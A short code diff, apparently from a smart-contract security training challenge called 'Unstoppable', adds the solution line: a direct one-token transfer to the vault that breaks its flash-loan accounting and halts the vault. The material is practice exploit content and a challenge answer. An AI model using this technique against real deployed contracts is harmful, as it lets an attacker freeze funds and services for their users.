@@ -36,6 +36,7 @@ describe('[Challenge] Unstoppable', function () {
     await receiverContract.executeFlashLoan(100n * 10n ** 18n);
 
     /** CODE YOUR SOLUTION HERE */
+    await token.transfer(vault, 1);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
